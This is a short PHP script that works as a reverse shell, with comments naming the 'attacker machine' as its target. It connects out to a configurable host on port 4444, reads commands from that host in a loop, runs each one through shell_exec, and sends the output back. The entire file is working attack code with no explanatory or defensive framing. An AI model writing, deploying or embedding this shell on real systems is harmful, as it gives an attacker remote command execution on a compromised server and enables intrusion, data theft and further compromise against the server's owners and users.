<?php
$server = ""; // Attacker machine Ip or hostname
$port = 4444; // Attacker machine port

$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_connect($socket, $server, $port);

$msg = socket_read($socket, 1024);
echo "[*] Server: " . $msg;

while (true) {
    $cmd = socket_read($socket, 1024);
    echo "Received Command: " . $cmd;

    if (in_array(strtolower(trim($cmd)), ['q', 'quit', 'exit', 'x'])) {
        break;
    }

    try {
        $result = shell_exec($cmd);
    } catch (Exception $e) {
        $result = $e->getMessage();
    }

    if (strlen($result) == 0) {
        $result = "[+] Executed Successfully";
    }

    socket_write($socket, $result, strlen($result));
}

socket_close($socket);
?>
